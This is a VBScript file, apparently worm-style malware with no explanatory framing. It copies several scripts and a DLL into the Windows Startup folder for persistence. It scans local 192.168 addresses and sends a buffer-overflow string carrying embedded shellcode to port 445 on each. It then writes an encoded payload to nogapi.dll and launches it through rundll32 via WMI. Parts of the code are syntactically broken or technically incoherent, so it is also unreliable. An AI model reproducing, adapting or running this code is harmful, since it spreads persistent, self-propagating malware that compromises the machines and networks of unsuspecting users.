Dim filenames(4)
filenames(0) = "wbs.vbs"
filenames(1) = "jtg.vbs"
filenames(2) = "lj.vbs"
filenames(3) = "go.bat"
filenames(4) = "nogapi.dll"

Dim currentDirectory
Set fso = CreateObject("Scripting.FileSystemObject")
currentDirectory = fso.GetAbsolutePathName(".")

Set files = fso.GetFolder(currentDirectory).Files
For Each file In files
    For Each filename In filenames
        If LCase(file.Name) = LCase(filename) Then
            Set WshShell = CreateObject("WScript.Shell")
            startupPath = WshShell.SpecialFolders("Startup")
            Set registryKey = WshShell.CreateShortcut(startupPath & "\" & file.Name & ".lnk")
            registryKey.TargetPath = file.Path
            registryKey.Save
            Exit For
        End If
    Next
Next
Function GetIPAddresses()
  Dim arrIPAddresses
  arrIPAddresses = Array()
  
  Dim objWMIService
  Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
  
  Dim colItems
  Set colItems = objWMIService.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True")
  
  Dim objItem
  For Each objItem in colItems
    Dim arrIPAddress
    arrIPAddress = objItem.IPAddress
    For Each strIPAddress in arrIPAddress
      If Left(strIPAddress, 7) = "192.168" Then
        ReDim Preserve arrIPAddresses(UBound(arrIPAddresses) + 1)
        arrIPAddresses(UBound(arrIPAddresses)) = strIPAddress
      End If
    Next
  Next
  
  GetIPAddresses = arrIPAddresses
End Function

Function s78()
    Dim arrIPAddresses
    arrIPAddresses = GetIPAddresses()

    For Each strIPAddress in arrIPAddresses
    On Error Resume Next
    Set tcpClient = CreateObject("MSWinsock.Winsock")
    host = strIPAddress
    port = 445
    offset = 2000

    ' Offset and return address
    ret = Array(&H8F, &H35, &H4A, &H5F)

    shellcode = Array(shellcode=Chr(187)&Chr(246)&Chr(182)&Chr(22)&Chr(190)&Chr(218)&Chr(195)&Chr(217)&Chr(116)&Chr(36)&Chr(244)&Chr(94)&Chr(43)&Chr(201)&Chr(177)&Chr(120)&Chr(49)&Chr(94)&Chr(20)&Chr(3)&Chr(94)&Chr(20)&Chr(131)&Chr(238)&Chr(252)&Chr(20)&Chr(67)&Chr(234)&Chr(86)&Chr(81)&Chr(172)&Chr(19)&Chr(167)&Chr(1)&Chr(36)&Chr(246)&Chr(150)&Chr(19)&Chr(82)&Chr(114)&Chr(138)&Chr(163)&Chr(16)&Chr(214)&Chr(39)&Chr(72)&Chr(116)&Chr(195)&Chr(188)&Chr(60)&Chr(81)&Chr(228)&Chr(117)&Chr(138)&Chr(135)&Chr(203)&Chr(134)&Chr(59)&Chr(8)&Chr(135)&Chr(69)&Chr(90)&Chr(244)&Chr(218)&Chr(153)&Chr(188)&Chr(197)&Chr(20)&Chr(236)&Chr(189)&Chr(2)&Chr(72)&Chr(31)&Chr(239)&Chr(219)&Chr(6)&Chr(178)&Chr(31)&Chr(111)&Chr(90)&Chr(15)&Chr(30)&Chr(191)&Chr(208)&Chr(47)&Chr(88)&Chr(186)&Chr(39)&Chr(219)&Chr(210)&Chr(197)&Chr(119)&Chr(116)&Chr(105)&Chr(141)&Chr(111)&Chr(254)&Chr(53)&Chr(46)&Chr(145)
shellcode=shellcode&Chr(211)&Chr(38)&Chr(18)&Chr(216)&Chr(88)&Chr(156)&Chr(224)&Chr(219)&Chr(136)&Chr(237)&Chr(9)&Chr(234)&Chr(244)&Chr(161)&Chr(55)&Chr(194)&Chr(248)&Chr(184)&Chr(112)&Chr(229)&Chr(226)&Chr(207)&Chr(138)&Chr(21)&Chr(158)&Chr(215)&Chr(72)&Chr(103)&Chr(68)&Chr(82)&Chr(77)&Chr(207)&Chr(15)&Chr(196)&Chr(181)&Chr(241)&Chr(220)&Chr(146)&Chr(62)&Chr(253)&Chr(169)&Chr(209)&Chr(25)&Chr(226)&Chr(44)&Chr(54)&Chr(18)&Chr(30)&Chr(164)&Chr(185)&Chr(245)&Chr(150)&Chr(254)&Chr(157)&Chr(209)&Chr(243)&Chr(165)&Chr(188)&Chr(64)&Chr(94)&Chr(11)&Chr(193)&Chr(147)&Chr(6)&Chr(244)&Chr(103)&Chr(223)&Chr(165)&Chr(225)&Chr(17)&Chr(130)&Chr(161)&Chr(155)&Chr(120)&Chr(73)&Chr(50)&Chr(12)&Chr(245)&Chr(216)&Chr(92)&Chr(165)&Chr(112)&Chr(252)&Chr(245)&Chr(93)&Chr(206)&Chr(118)&Chr(208)&Chr(154)&Chr(49)&Chr(173)&Chr(45)&Chr(90)&Chr(154)&Chr(25)&Chr(25)&Chr(243)&Chr(114)&Chr(206)&Chr(159)
shellcode=shellcode&Chr(173)&Chr(3)&Chr(169)&Chr(31)&Chr(132)&Chr(24)&Chr(214)&Chr(132)&Chr(22)&Chr(23)&Chr(72)&Chr(106)&Chr(51)&Chr(164)&Chr(58)&Chr(221)&Chr(171)&Chr(17)&Chr(189)&Chr(221)&Chr(43)&Chr(54)&Chr(238)&Chr(181)&Chr(124)&Chr(49)&Chr(145)&Chr(128)&Chr(124)&Chr(148)&Chr(69)&Chr(67)&Chr(218)&Chr(39)&Chr(72)&Chr(14)&Chr(180)&Chr(71)&Chr(94)&Chr(15)&Chr(192)&Chr(21)&Chr(204)&Chr(29)&Chr(152)&Chr(203)&Chr(160)&Chr(201)&Chr(241)&Chr(190)&Chr(110)&Chr(49)&Chr(249)&Chr(149)&Chr(230)&Chr(131)&Chr(111)&Chr(5)&Chr(162)&Chr(99)&Chr(240)&Chr(22)&Chr(84)&Chr(116)&Chr(121)&Chr(184)&Chr(62)&Chr(112)&Chr(41)&Chr(82)&Chr(160)&Chr(46)&Chr(161)&Chr(215)&Chr(152)&Chr(80)&Chr(183)&Chr(232)&Chr(240)&Chr(92)&Chr(71)&Chr(65)&Chr(172)&Chr(201)&Chr(224)&Chr(59)&Chr(58)&Chr(219)&Chr(8)&Chr(219)&Chr(193)&Chr(220)&Chr(192)&Chr(94)&Chr(245)&Chr(86)&Chr(168)&Chr(43)&Chr(249)&Chr(28)
shellcode=shellcode&Chr(142)&Chr(171)&Chr(5)&Chr(29)&Chr(36)&Chr(122)&Chr(236)&Chr(175)&Chr(186)&Chr(124)&Chr(239)&Chr(39)&Chr(22)&Chr(131)&Chr(16)&Chr(72)&Chr(72)&Chr(9)&Chr(142)&Chr(217)&Chr(243)&Chr(148)&Chr(61)&Chr(71)&Chr(146)&Chr(81)&Chr(137)&Chr(176)&Chr(93)&Chr(170)&Chr(194)&Chr(137)&Chr(150)&Chr(227)&Chr(3)&Chr(130)&Chr(176)&Chr(110)&Chr(47)&Chr(3)&Chr(45)&Chr(28)&Chr(182)&Chr(169)&Chr(194)&Chr(178)&Chr(45)&Chr(97)&Chr(111)&Chr(43)&Chr(217)&Chr(82)&Chr(226)&Chr(202)&Chr(76)&Chr(195)&Chr(211)&Chr(97)&Chr(253)&Chr(53)&Chr(90)&Chr(27)&Chr(114)&Chr(74)&Chr(73)&Chr(176)&Chr(69)&Chr(138)&Chr(210)&Chr(22)&Chr(204)&Chr(8)&Chr(135)&Chr(148)&Chr(64)&Chr(103)&Chr(85)&Chr(242)&Chr(98)&Chr(32)&Chr(49)&Chr(216)&Chr(149)&Chr(20)&Chr(142)&Chr(35)&Chr(140)&Chr(58)&Chr(32)&Chr(27)&Chr(73)&Chr(133)&Chr(71)&Chr(152)&Chr(191)&Chr(49)&Chr(19)&Chr(19)&Chr(243)&Chr(157)
shellcode=shellcode&Chr(148)&Chr(26)&Chr(204)&Chr(106)&Chr(167)&Chr(12)&Chr(157)&Chr(196)&Chr(192)&Chr(190)&Chr(139)&Chr(96)&Chr(242)&Chr(65)&Chr(102)&Chr(247)&Chr(51)&Chr(201)&Chr(164)&Chr(160)&Chr(54)&Chr(241)&Chr(195)&Chr(70)&Chr(83)&Chr(241)&Chr(127)&Chr(55)&Chr(46)&Chr(181)&Chr(91)&Chr(187)&Chr(96)&Chr(102)&Chr(204)&Chr(238)&Chr(215)&Chr(38)&Chr(87)&Chr(14)&Chr(2)&Chr(181)&Chr(132)&Chr(244)&Chr(70)&Chr(119)&Chr(7)&Chr(157)&Chr(94)&Chr(17)&Chr(47)&Chr(15)&Chr(160)&Chr(200)&Chr(90)&Chr(176)&Chr(9)&Chr(154)&Chr(171)&Chr(59)&Chr(218)&Chr(221)&Chr(51)&Chr(238)&Chr(79)&Chr(225)&Chr(163)&Chr(225)&Chr(37)&Chr(67)&Chr(101)&Chr(253)&Chr(147)&Chr(107)&Chr(26)&Chr(254)&Chr(227)&Chr(148)&Chr(105)&Chr(116)&Chr(114)&Chr(14)&Chr(191)&Chr(71)&Chr(164)&Chr(171)&Chr(199)&Chr(194)&Chr(184)&Chr(219)&Chr(217)&Chr(243)&Chr(70)&Chr(228)&Chr(125)&Chr(101)&Chr(205)&Chr(114)&Chr(247)&Chr(23)
shellcode=shellcode&Chr(3)&Chr(225)&Chr(152)&Chr(186)&Chr(91))

    buf = "USER " & String(offset, "A") & ChrW(ret(0)) & ChrW(ret(1)) & ChrW(ret(2)) & ChrW(ret(3))
    For i = 1 To 20
        buf = buf & ChrW(&H90)
    Next
    For i = 0 To UBound(shellcode)
        buf = buf & ChrW(shellcode(i))
    Next
    buf = buf & vbCrLf

    tcpClient.Connect host, port

    tcpClient.SendData buf

    Do While tcpClient.State <> 0
        If tcpClient.State = 7 Then
            response = tcpClient.GetData
            WScript.Echo response
            Exit Do
        End If
        WScript.Sleep 100
    Loop

    tcpClient.Close
    If Err.Number = 0 Then
        ' Script executed successfully on remote machine
    End If
    Next
End Function

Function dmn()
Set objShell = CreateObject("WScript.Shell")
strCode = "dbc0d97424f4ba14a8d9755f31c9b17131571883effc0357004a2c89c003cf721074599721a63dd3137635b19ffd1b221473b4459d3ee2681e8f2a26dc91d6353072e6f545732feba521f86717d68d3aabd7413193afe486671ae6d6d711a0ce5c7d11eeb19d6db9be56053816a7e60a5664d9a25b741d04830355763e14ae04e49133ae6f01904ebcd4535c09923c418c77377d057698f75d5d3c5306fc6539e90175e556a4fd0483de5f413dba2b91a933bdff4035db54fa095373fd6e4e4afec626fa57bfa03e014696c07853bb65b36d6dcbd96edfba75cade3c857fb154d2f6ae6323dd3a2482ef6ee95c10bdae184293fc713143699ae04d52a3de1b6231f1400345c276d3ccc51dd79e6ffd81760547b0001a92fdf3b24aa95c6b1d78648ba67dbd2e98f7227a167c207c287c33adc1f2c34e12e36fb1ed0c407c658aaee7fd42ac86899adb22435b44e5c95910075e34e66d5c9f8eab96c501b38269ac8b4b36ca08bd828683f12e2eadc99b2d9d98b5590f8db37bd06446bb5baa11be64c0b7aa647de8a7215904e7fac939505352bd8b288945d8e1012ed86822fc1b414701b402a98a55543659c35aa192a6f967ac1d1517ad62196a27f282baf6242ec59d385830a1c767573443eccdb4856f6f4dbb00178356b082db"
For i = 1 to Len(strCode) Step 2
    objShell.Run "cmd /c echo|" & Mid(strCode, i, 2) & " /nologo >> nogapi.dll", 0, True
Next
dllPath = "nogapi.dll"

Set kernel32 = GetObject("winmgmts:root\cimv2:Win32_Process")
result = kernel32.Create("rundll32 """ & dllPath & """,DllRegisterServer")
End Function
s78()
dmn()

